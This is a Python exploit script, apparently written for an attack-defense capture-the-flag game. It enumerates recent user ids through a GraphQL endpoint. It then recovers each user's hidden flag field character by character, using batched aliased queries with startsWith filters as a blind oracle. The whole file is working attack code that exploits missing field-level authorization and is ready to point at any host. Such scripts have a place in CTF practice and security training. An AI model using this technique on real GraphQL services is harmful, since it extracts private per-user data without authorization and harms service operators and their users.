import requests
import time
import re
import sys

s = requests.session()

HOST = sys.argv[1]

def get_chars(user_id, pos_start, pos_end):
  query = "query {"

  for pos in range(pos_start, pos_end):
    for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890":
      query += f'i{pos}_{ord(c)}:users(where: {{ id: {{equals: "{user_id}"}}, flag: {{startsWith: "{"_"*pos}{c}"}} }}) {{ id }}\n'

  query += "}"

  json_data = {"query": query}
  ans = s.post(f"http://{HOST}:3000/api/graphql", json=json_data).json()["data"]
  ans = [a for a in ans if ans[a]]

  chars = ["_"] * (pos_end-pos_start)

  for a in ans:
    pos, char = map(int, a[1:].split("_"))
    chars[pos-pos_start] = chr(char)

  return "".join(chars).rstrip("_")


def get_flag_by_id(flag_id):
  flag = ""
  for i in range(0, 40, 20):
    flag += get_chars(flag_id, i, i+20)

  return flag


def get_id_list():
  json_data = {
    "query":"query {users(take: 10, orderBy: {createdAt: desc}) {id}}"
  }

  items = s.post(f"http://{HOST}:3000/api/graphql", json=json_data).json()["data"]["users"]

  id_list = [i["id"] for i in items]

  return id_list

for user_id in get_id_list():
  flag = get_flag_by_id(user_id)
  print(flag)

